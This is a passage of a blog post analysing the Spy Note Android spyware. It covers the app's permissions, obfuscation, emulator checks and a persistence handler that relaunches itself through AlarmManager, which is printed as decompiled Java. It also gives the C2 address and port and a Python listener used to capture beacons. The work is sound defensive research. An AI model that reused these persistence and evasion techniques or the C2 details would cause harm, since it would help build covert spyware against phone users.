<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <title>Ahmed | Spy Note Android Malware Analysis</title>
    <meta
      name="description"
      content="This blog post uncovers a detailed analysis of Spy Note Android Malware."
    />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta property="og:title" content="Spy Note Android Malware Analysis" />
    <meta property="og:type" content="website" />
    <meta
      property="og:url"
      content="https://s4yed.github.io/posts/spy-note-android-malware-analysis"
    />
    <meta
      property="og:description"
      content="This blog post uncovers a detailed analysis of Spy Note Android Malware."
    />
    <meta property="og:site_name" content="Ahmed" />

    <meta name="twitter:card" content="summary" />
    <meta
      name="twitter:url"
      content="https://s4yed.github.io/posts/spy-note-android-malware-analysis"
    />
    <meta name="twitter:title" content="Spy Note Android Malware Analysis" />
    <meta
      name="twitter:description"
      content="This blog post uncovers a detailed analysis of Spy Note Android Malware."
    />

    <meta
      property="og:image"
      content="https://s4yed.github.io/assets/documentation/Spy-Note-Analysis/main-ea0c421fcddd81835aa8f016ea773eb06dabee023c740df12057108977783dcd.png"
    />
    <meta
      name="twitter:image"
      content="https://s4yed.github.io/assets/documentation/Spy-Note-Analysis/main-ea0c421fcddd81835aa8f016ea773eb06dabee023c740df12057108977783dcd.png"
    />

    <link
      href="https://s4yed.github.io/feed.xml"
      type="application/rss+xml"
      rel="alternate"
      title="Ahmed Last 10 blog posts"
    />

    <link
      rel="icon"
      type="image/x-icon"
      href="/assets/favicon-color-0e896bd8673d9f83cea8d7b0a12fcc894681d58fc475ad499adfed94067b1e1f.png"
    />
    <link
      rel="apple-touch-icon"
      href="/assets/apple-touch-icon-dark-d161409442b7e523089f24d08d0a55951549ece7504207c376d53b020713494d.png"
    />
    <link
      rel="stylesheet"
      type="text/css"
      title="light"
      id="light"
      href="/assets/light-b844ce2b2c3063f66fe208d0ea1d8acb9fd6089d25f05cd0c45c3f9d10e0e574.css"
    />
    <link
      rel="stylesheet"
      type="text/css"
      title="dark"
      id="dark"
      href="/assets/dark-c6918cbe82fc04b68125b494e6c23ce9c7935d17fe74045d6b9021f137109a04.css"
      disabled="false"
    />

    <!-- Load KaTeX -->
    <link
      rel="stylesheet"
      href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.1.1/katex.min.css"
    />
    <script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.1.1/katex.min.js"></script>
  </head>

  <body>
    <main>
      <div class="grid grid-centered">
        <div class="grid-cell">
          <nav class="header-nav scrollappear">
            <a href="/" class="header-logo" title="Ahmed">Ahmed</a>
            <ul class="header-links">
              <li>
                <a href="/about" title="About me">
                  <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
                    <use
                      href="/assets/about-ab4928d09cef6e09136b8d40637999db4f9575f927c33156e7f3e37d450e5df1.svg#icon-about"
                      xlink:href="/assets/about-ab4928d09cef6e09136b8d40637999db4f9575f927c33156e7f3e37d450e5df1.svg#icon-about"
                    ></use>
                  </svg>
                </a>
              </li>

              <li>
                <a
                  href="https://github.com/s4yed"
                  rel="noreferrer noopener"
                  target="_blank"
                  title="GitHub"
                >
                  <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
                    <use
                      href="/assets/github-706d546fe6b5a32deca92fb08bbe60e78ea4e8027e889107905eb61f1063bcec.svg#icon-github"
                      xlink:href="/assets/github-706d546fe6b5a32deca92fb08bbe60e78ea4e8027e889107905eb61f1063bcec.svg#icon-github"
                    ></use>
                  </svg>
                </a>
              </li>

              <li>
                <a
                  href="https://www.linkedin.com/in/s4yed"
                  rel="noreferrer noopener"
                  target="_blank"
                  title="LinkedIn"
                >
                  <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
                    <use
                      href="/assets/linkedin-3bd8eb5ea036958dc7b3ee3de6612dbfa9e0744f369f20f7895d6a2782bbaf43.svg#icon-linkedin"
                      xlink:href="/assets/linkedin-3bd8eb5ea036958dc7b3ee3de6612dbfa9e0744f369f20f7895d6a2782bbaf43.svg#icon-linkedin"
                    ></use>
                  </svg>
                </a>
              </li>

              <li>
                <a
                  href="https://discord.gg/Y4mm1#7774"
                  rel="noreferrer noopener"
                  target="_blank"
                  title="Discord Server"
                >
                  <svg xmlns="http://www.w3.org/2000/svg" class="icon-discord">
                    <use
                      href="/assets/discord-31958f8a24fd49834876e398b1793cd068c7d12a1db745c6da2ecc8b1f7576f5.svg#icon-discord"
                      xlink:href="/assets/discord-31958f8a24fd49834876e398b1793cd068c7d12a1db745c6da2ecc8b1f7576f5.svg#icon-discord"
                    ></use>
                  </svg>
                </a>
              </li>

              <li>
                <a
                  href="/feed.xml"
                  rel="noreferrer noopener"
                  target="_blank"
                  title="RSS"
                >
                  <svg xmlns="http://www.w3.org/2000/svg" class="icon-rss">
                    <use
                      href="/assets/rss-cdc7a721b47671668abb0ba57f9f8db8022096e0051ff51b9e08e6cc049453a4.svg#icon-rss"
                      xlink:href="/assets/rss-cdc7a721b47671668abb0ba57f9f8db8022096e0051ff51b9e08e6cc049453a4.svg#icon-rss"
                    ></use>
                  </svg>
                </a>
              </li>

              <li>
                <a onclick="toggle()" title="Toggle Theme">
                  <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
                    <use
                      href="/assets/theme-610197c56844c5ba34608b2018c4cc3b79f8833e2efc7a99bcb5589f1d3cfd7b.svg#icon-theme"
                      xlink:href="/assets/theme-610197c56844c5ba34608b2018c4cc3b79f8833e2efc7a99bcb5589f1d3cfd7b.svg#icon-theme"
                    ></use>
                  </svg>
                </a>
              </li>
            </ul>
          </nav>

          <ul class="header-tags scrollappear">
            <li><a href="/tag/AES">Aes</a></li>

            <li><a href="/tag/ASC-Wargames">Asc-wargames</a></li>

            <li><a href="/tag/AUCTF">Auctf</a></li>

            <li><a href="/tag/AnDetect">Andetect</a></li>

            <li><a href="/tag/CTF">Ctf</a></li>

            <li><a href="/tag/ECC">Ecc</a></li>

            <li><a href="/tag/RSA">Rsa</a></li>

            <li><a href="/tag/WPICTF">Wpictf</a></li>

            <li><a href="/tag/algorithms">Algorithms</a></li>

            <li><a href="/tag/analysis">Analysis</a></li>

            <li>...</li>
            <li><a href="/tags">Show all</a></li>
          </ul>

          <article class="article scrollappear">
            <header class="article-header">
              <h1>Spy Note Android Malware Analysis</h1>
              <p>
                This blog post uncovers a detailed analysis of Spy Note Android
                Malware.
              </p>
              <div class="article-list-footer">
                <span class="article-list-date"> January 11, 2025 </span>
                <span class="article-list-divider">-</span>
                <span class="article-list-minutes"> 13 minute read </span>
                <span class="article-list-divider">-</span>
                <div class="article-list-tags">
                  <a
                    href="/tag/security"
                    title="See all posts with tag 'Security'"
                    >Security</a
                  >

                  <a
                    href="/tag/reverse"
                    title="See all posts with tag 'Reverse'"
                    >Reverse</a
                  >

                  <a
                    href="/tag/android"
                    title="See all posts with tag 'Android'"
                    >Android</a
                  >

                  <a
                    href="/tag/malware"
                    title="See all posts with tag 'Malware'"
                    >Malware</a
                  >

                  <a
                    href="/tag/analysis"
                    title="See all posts with tag 'Analysis'"
                    >Analysis</a
                  >

                  <a href="/tag/mobile" title="See all posts with tag 'Mobile'"
                    >Mobile</a
                  >
                </div>
              </div>
            </header>

            <div class="article-content">
              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/main-ea0c421fcddd81835aa8f016ea773eb06dabee023c740df12057108977783dcd.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/main-ea0c421fcddd81835aa8f016ea773eb06dabee023c740df12057108977783dcd.png"
                    alt="AnDetect"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/main-ea0c421fcddd81835aa8f016ea773eb06dabee023c740df12057108977783dcd.png"
                    data-zooming-width="1792"
                    data-zooming-height="1024"
                  />
                </a>
              </p>

              <h3 id="content">Content:</h3>

              <ol>
                <li><a href="#intro">Intro</a></li>
                <li><a href="#entry-point">Entry Point</a></li>
                <li><a href="#main-act">Main Activity</a></li>
                <li><a href="#c2">C2 Server</a></li>
                <li><a href="#spying">Spying Capabilities</a></li>
                <li><a href="#conc">Conclusion</a></li>
              </ol>

              <p><a id="intro"></a></p>

              <h2 id="intro">Intro</h2>

              <p>
                Back in 2017, Spy Note was discovered posing as the Netflix app.
                It has RAT capabilities that allow it to perform malicious
                actions on Android devices. In January 2023, a new variant of
                Spy Note was found impersonating well-known mobile apps like
                WhatsApp, Facebook, and Google Play, as well as more generic
                apps such as wallpaper apps, productivity apps, and even gaming
                apps. In this blog post, we will analyze most of the
                functionalities it performs and explore how it can compromise
                user privacy and critical data.
              </p>

              <p><a id="entry-point"></a></p>

              <h2 id="entry-point">Entry Point</h2>

              <p>
                Let’s first look at the
                <code class="language-plaintext highlighter-rouge"
                  >AndroidManifest.xml</code
                >
                file to have an overview of the application’s classes and
                definitions. The pre-defined following 31 permissions was
                assigned to the app and most importantly gives the application
                the ability to do the following:
              </p>

              <ul>
                <li>Send SMS messages</li>
                <li>Read call log</li>
                <li>Read contact list</li>
                <li>Access Camera and percise device’s location</li>
                <li>Record audio from the device’s microfone</li>
                <li>Disable lock screen</li>
                <li>Read/Write to external storage</li>
                <li>Ability to install and remove applications</li>
                <li>Access to internet and wifi networks</li>
              </ul>

              <figure class="highlight">
                <pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.SEND_SMS"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.SET_WALLPAPER"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.READ_SMS"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.READ_CALL_LOG"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.READ_CONTACTS"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.GET_ACCOUNTS"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.CAMERA"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.RECORD_AUDIO"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.ACCESS_COARSE_LOCATION"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.ACCESS_FINE_LOCATION"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.CALL_PHONE"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.DISABLE_KEYGUARD"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.FOREGROUND_SERVICE"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.READ_EXTERNAL_STORAGE"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.RECEIVE_BOOT_COMPLETED"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.WRITE_EXTERNAL_STORAGE"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"oppo.permission.OPPO_COMPONENT_SAFE"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"oplus.permission.OPLUS_COMPONENT_SAFE"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"com.huawei.permission.external_app_settings.USE_COMPONENT"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.INTERNET"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.SYSTEM_ALERT_WINDOW"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.READ_PHONE_STATE"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.WAKE_LOCK"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"com.android.alarm.permission.SET_ALARM"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.ACCESS_NETWORK_STATE"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.ACCESS_WIFI_STATE"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.CHANGE_WIFI_STATE"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.REQUEST_INSTALL_PACKAGES"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.REQUEST_DELETE_PACKAGES"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.USE_FULL_SCREEN_INTENT"</span><span class="nt">/&gt;</span></code></pre>
              </figure>

              <p>
                As you can see below, the malware implements some sort of
                obfuscation on the classes and function names. Digging deeper,
                you’ll notice that the obfuscation technique is just an
                insertion of random chars in the middle of the class or method
                name.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/1-b4856a461613bcaf7c728ef4282c21a6cce182c89f5da3c855923ee531ae9fbc.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/1-b4856a461613bcaf7c728ef4282c21a6cce182c89f5da3c855923ee531ae9fbc.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/1-b4856a461613bcaf7c728ef4282c21a6cce182c89f5da3c855923ee531ae9fbc.png"
                    data-zooming-width="2507"
                    data-zooming-height="1214"
                  />
                </a>
              </p>

              <p>
                Therefore,
                <code class="language-plaintext highlighter-rouge"
                  >Mylyuntblmikcenkxceinxkcnkcdjwktzpuzlzdnjbmjtudkgqxb14Application</code
                >, which is the entry activity class, will be
                <code class="language-plaintext highlighter-rouge"
                  >MyApplication</code
                >. Next, cleaning all other classes’ names so that we can easily
                continue analyzing tha malware.
              </p>

              <blockquote>
                <p>
                  Some of the classes are not obfuscated as we described and
                  kept it as it is.
                </p>
              </blockquote>

              <h3 id="scheduler-run">Scheduler Run</h3>

              <p>
                In the entry class, the app has a well-implemented trick to keep
                itself running. It registers a
                <code class="language-plaintext highlighter-rouge"
                  >Thread.setDefaultUncaughtExceptionHandler</code
                >
                callback, which tells the <strong>JVM</strong> if any unhandled
                exception has occurred. The application schedules itself to run
                again after a second via the
                <code class="language-plaintext highlighter-rouge"
                  >AlarmManager</code
                >
                system service, as you can see in the snippet below.
              </p>

              <figure class="highlight">
                <pre><code class="language-java" data-lang="java"><span class="nc">Thread</span><span class="o">.</span><span class="na">setDefaultUncaughtExceptionHandler</span><span class="o">(</span><span class="k">new</span> <span class="nc">Thread</span><span class="o">.</span><span class="na">UncaughtExceptionHandler</span><span class="o">()</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">uncaughtException</span><span class="o">(</span><span class="nc">Thread</span> <span class="n">thread</span><span class="o">,</span> <span class="nc">Throwable</span> <span class="n">th</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">MyApplication</span> <span class="n">myApplication</span> <span class="o">=</span> <span class="nc">MyApplication</span><span class="o">.</span><span class="na">this</span><span class="o">;</span>
        <span class="nc">String</span> <span class="n">exceptionInformation</span> <span class="o">=</span> <span class="n">myApplication</span><span class="o">.</span><span class="na">getExceptionInformation</span><span class="o">(</span><span class="n">th</span><span class="o">,</span> <span class="n">myApplication</span><span class="o">.</span><span class="na">getApplicationContext</span><span class="o">());</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">wsfokmvmcshlqtqmbcoglszscsewjugqxkmygzrkdiudhqjigs38</span><span class="o">.</span><span class="na">echo</span><span class="o">)</span> <span class="o">{</span>
            <span class="nc">String</span> <span class="n">str</span> <span class="o">=</span> <span class="n">ngmnirovqjnqgajxajbdwddatjoeofelxjqmvstbqnbjrbxkhs9</span><span class="o">.</span><span class="na">EX</span><span class="o">;</span>
            <span class="n">wsfokmvmcshlqtqmbcoglszscsewjugqxkmygzrkdiudhqjigs38</span><span class="o">.</span><span class="na">uyzcwzjgtnouhyxrvjdiqefnzxvpmlzgqywbflfzjtevyyorhz52</span><span class="o">(</span><span class="n">str</span><span class="o">,</span> <span class="o">(</span><span class="s">"Error :"</span> <span class="o">+</span> <span class="n">exceptionInformation</span><span class="o">).</span><span class="na">getBytes</span><span class="o">());</span>
        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
            <span class="n">_MySettings</span><span class="o">.</span><span class="na">Write</span><span class="o">(</span><span class="nc">MyApplication</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">getApplicationContext</span><span class="o">(),</span> <span class="n">_MySettings</span><span class="o">.</span><span class="na">Crash</span><span class="o">,</span> <span class="n">exceptionInformation</span><span class="o">);</span>
        <span class="o">}</span>
        <span class="nc">Intent</span> <span class="n">intent</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Intent</span><span class="o">(</span><span class="nc">MyApplication</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">getApplicationContext</span><span class="o">(),</span> <span class="nc">MainActivity</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
        <span class="n">intent</span><span class="o">.</span><span class="na">addFlags</span><span class="o">(</span><span class="mi">268468224</span><span class="o">);</span>
        <span class="o">((</span><span class="nc">AlarmManager</span><span class="o">)</span> <span class="nc">MyApplication</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">getSystemService</span><span class="o">(</span><span class="nc">NotificationCompat</span><span class="o">.</span><span class="na">CATEGORY_ALARM</span><span class="o">)).</span><span class="na">set</span><span class="o">(</span><span class="mi">1</span><span class="o">,</span> <span class="nc">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()</span> <span class="o">+</span> <span class="mi">1000</span><span class="o">,</span> <span class="nc">PendingIntent</span><span class="o">.</span><span class="na">getActivity</span><span class="o">(</span><span class="nc">MyApplication</span><span class="o">.</span><span class="na">this</span><span class="o">.</span><span class="na">getApplicationContext</span><span class="o">(),</span> <span class="mi">0</span><span class="o">,</span> <span class="n">intent</span><span class="o">,</span> <span class="mi">1275068416</span><span class="o">));</span>
        <span class="nc">System</span><span class="o">.</span><span class="na">exit</span><span class="o">(</span><span class="mi">2</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">});</span></code></pre>
              </figure>

              <p>
                It also keeps track of the exception details that occur while
                it’s running via the
                <code class="language-plaintext highlighter-rouge"
                  >getExceptionInformation</code
                >
                function.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/2-0ae6b15443667dc6dd4bf6228041a6a0016f77687de5ae8e3e616c7e2cc8d522.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/2-0ae6b15443667dc6dd4bf6228041a6a0016f77687de5ae8e3e616c7e2cc8d522.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/2-0ae6b15443667dc6dd4bf6228041a6a0016f77687de5ae8e3e616c7e2cc8d522.png"
                    data-zooming-width="1228"
                    data-zooming-height="1036"
                  />
                </a>
              </p>

              <p><a id="main-act"></a></p>

              <h2 id="main-activity">Main Activity</h2>

              <p>
                As described, the scheduler was set with an intent with this
                class
                <code class="language-plaintext highlighter-rouge"
                  >xtkxxuojslebyxwckonorenubwmjxgrdfwrnbhiccrpdhunfel31</code
                >, so I renamed it
                <code class="language-plaintext highlighter-rouge"
                  >MainActivity</code
                >. While looking at the
                <code class="language-plaintext highlighter-rouge"
                  >onCreate</code
                >
                method,
                <code class="language-plaintext highlighter-rouge">jadx</code>
                wouldn’t be able to decompile it. So, lets look at its
                <code class="language-plaintext highlighter-rouge">smali</code>
                code. It first gets the screen display width and height and
                write those value into
                <code class="language-plaintext highlighter-rouge"
                  >SharedPreferences</code
                >
                via
                <code class="language-plaintext highlighter-rouge"
                  >_MySettings</code
                >
                class. Then, it performs some default emulator checks via
                <code class="language-plaintext highlighter-rouge"
                  >Anti_emu</code
                >,
                <code class="language-plaintext highlighter-rouge"
                  >isEmu_DIV_ID_lator</code
                >, and
                <code class="language-plaintext highlighter-rouge"
                  >AsknoEmu</code
                >.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/3-82a7875fd68d39e106f5fad65b0146f25e26c62ddebfe37f47896fa2f86c15e7.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/3-82a7875fd68d39e106f5fad65b0146f25e26c62ddebfe37f47896fa2f86c15e7.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/3-82a7875fd68d39e106f5fad65b0146f25e26c62ddebfe37f47896fa2f86c15e7.png"
                    data-zooming-width="1879"
                    data-zooming-height="1072"
                  />
                </a>
              </p>

              <p>
                As you can see in
                <code class="language-plaintext highlighter-rouge"
                  >isEmu_DIV_ID_lator</code
                >, the strings have the same obfuscation technique and it
                deobfuscates them at runtime. Deobfuscation leads to some
                generic emulator names.
                <em
                  >I’ve demonstrated such methods in this
                  <a
                    href="https://s4yed.github.io/posts/deep-diving-into-the-android-rasp"
                    >blog post</a
                  >.</em
                >
                The
                <code class="language-plaintext highlighter-rouge"
                  >AsknoEmu</code
                >
                method propmts a message of emulator detection with different
                languages. Main activity also requests auto start and draw over
                apps permissions to work properly in the background.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/4-3480da7a399dff3dc8fa57e62ff603da5230035f92d6ab6648423422f5ffe865.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/4-3480da7a399dff3dc8fa57e62ff603da5230035f92d6ab6648423422f5ffe865.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/4-3480da7a399dff3dc8fa57e62ff603da5230035f92d6ab6648423422f5ffe865.png"
                    data-zooming-width="1845"
                    data-zooming-height="586"
                  />
                </a>
              </p>

              <p>
                After that, it initializes
                <code class="language-plaintext highlighter-rouge"
                  >WebView</code
                >
                with
                <code class="language-plaintext highlighter-rouge"
                  >setJavaScriptEnabled</code
                >
                being enabled which loads the following URL
                <code class="language-plaintext highlighter-rouge"
                  >https://appfreelancer-87696.web.app/</code
                >
                that was found in the code and was still up and running.
              </p>

              <p><a id="c2"></a></p>

              <h2 id="c2-server">C2 Server</h2>

              <p>
                Back to
                <code class="language-plaintext highlighter-rouge"
                  >MyApplication</code
                >, while an uncaught exception is occurring, the malware sends
                the exception error details to this method:
                <code class="language-plaintext highlighter-rouge"
                  >uyzcwzjgtnouhyxrvjdiqefnzxvpmlzgqywbflfzjtevyyorhz52</code
                >, which is a method under a service class named
                <code class="language-plaintext highlighter-rouge"
                  >wsfokmvmcshlqtqmbcoglszscsewjugqxkmygzrkdiudhqjigs38</code
                >. Digging deeper into this service, a connection function was
                found at the end of the class. Additionally, the C2 server IP
                <code class="language-plaintext highlighter-rouge"
                  >157.10.203.155</code
                >
                and port
                <code class="language-plaintext highlighter-rouge">7771</code>
                were also found, base64 encoded, in another service named
                <code class="language-plaintext highlighter-rouge"
                  >uooxuybinieguhhahsxdwslzrhshusblbobbbjtkftrljhdkjr71</code
                >.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/5-53d6723520ceb255c8630f8640e7e46302fada3ef665f3b824fc66dd2735608c.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/5-53d6723520ceb255c8630f8640e7e46302fada3ef665f3b824fc66dd2735608c.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/5-53d6723520ceb255c8630f8640e7e46302fada3ef665f3b824fc66dd2735608c.png"
                    data-zooming-width="1883"
                    data-zooming-height="723"
                  />
                </a>
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/6-b12a34b393dbdfb809104d02678b2cd4e959b3dbb38fd6c67da10d897d2a1bd6.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/6-b12a34b393dbdfb809104d02678b2cd4e959b3dbb38fd6c67da10d897d2a1bd6.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/6-b12a34b393dbdfb809104d02678b2cd4e959b3dbb38fd6c67da10d897d2a1bd6.png"
                    data-zooming-width="1489"
                    data-zooming-height="328"
                  />
                </a>
              </p>

              <p>
                Looking again at
                <code class="language-plaintext highlighter-rouge"
                  >MainConnectionService</code
                >, It creates a connection to the C2 and encodes any meesage
                with Gzip before sending it. The first meesage it sends to the
                C2 contains the following
                <code class="language-plaintext highlighter-rouge"
                  >-1[ip]:[port]:AppData:system_info:system_config:meta_data:[ip]:11000011:[CR]:V4:</code
                >.
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/8-2671fdb23aa304c4c4fa9a566bc8c9053d2a9713e8e32cad97188cea704b3a36.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/8-2671fdb23aa304c4c4fa9a566bc8c9053d2a9713e8e32cad97188cea704b3a36.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/8-2671fdb23aa304c4c4fa9a566bc8c9053d2a9713e8e32cad97188cea704b3a36.png"
                    data-zooming-width="1479"
                    data-zooming-height="298"
                  />
                </a>
              </p>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/7-67ef8506b2381f65eedad11aee2607a5b1bd9afa7ebe3eaf8b02290949121150.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/7-67ef8506b2381f65eedad11aee2607a5b1bd9afa7ebe3eaf8b02290949121150.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/7-67ef8506b2381f65eedad11aee2607a5b1bd9afa7ebe3eaf8b02290949121150.png"
                    data-zooming-width="889"
                    data-zooming-height="318"
                  />
                </a>
              </p>

              <blockquote>
                <p>
                  At the time of writing this blog, the C2 server seems down or
                  uses the same port, as it appeared in wireshark, with another
                  service/connection. So, I had to simulate my machine as a C2
                  with the same ip.
                </p>
              </blockquote>

              <p>
                <a
                  href="/assets/documentation/Spy-Note-Analysis/9-35380855c96d22557f868bd32a59e75415536da0cfd5f99056068a8d589c43ce.png"
                >
                  <img
                    src="/assets/documentation/Spy-Note-Analysis/9-35380855c96d22557f868bd32a59e75415536da0cfd5f99056068a8d589c43ce.png"
                    alt="Spy Note"
                    class="zooming"
                    data-rjs="/assets/documentation/Spy-Note-Analysis/9-35380855c96d22557f868bd32a59e75415536da0cfd5f99056068a8d589c43ce.png"
                    data-zooming-width="1995"
                    data-zooming-height="573"
                  />
                </a>
              </p>

              <p><a id="spying"></a></p>

              <h2 id="spying-capabilities">Spying Capabilities</h2>

              <p>
                The spyware utilizes various services and broadcast receivers to
                ensure its functionality remains active. So, I set up a Python
                server to capture the messages it sends.
              </p>

              <figure class="highlight">
                <pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socketserver</span> <span class="p">,</span><span class="n">threading</span>
<span class="kn">import</span> <span class="nn">gzip</span>
<span class="k">class</span> <span class="nc">ThreadedTCPServer</span><span class="p">(</span><span class="n">socketserver</span><span class="p">.</span><span class="n">ThreadingMixIn</span><span class="p">,</span> <span class="n">socketserver</span><span class="p">.</span><span class="n">TCPServer</span><span class="p">):</span>
    <span class="k">pass</span>
<span class="k">class</span> <span class="nc">MyTCPHandler</span><span class="p">(</span><span class="n">socketserver</span><span class="p">.</span><span class="n">BaseRequestHandler</span><span class="p">):</span>
    <span class="k">def</span> <span class="nf">handle</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
            <span class="n">inp</span> <span class="o">=</span> <span class="bp">self</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
            <span class="k">print</span><span class="p">(</span><span class="n">inp</span><span class="p">.</span><span class="nb">hex</span><span class="p">())</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="k">print</span><span class="p">(</span><span class="n">gzip</span><span class="p">.</span><span class="n">decompress</span><span class="p">(</span><span class="n">inp</span><span class="p">[</span><span class="mi">6</span><span class="p">:]))</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="k">pass</span>

<span class="n">socketserver</span><span class="p">.</span><span class="n">TCPServer</span><span class="p">.</span><span class="n">allow_reuse_address</span> <span class="o">=</span> <span class="bp">True</span>
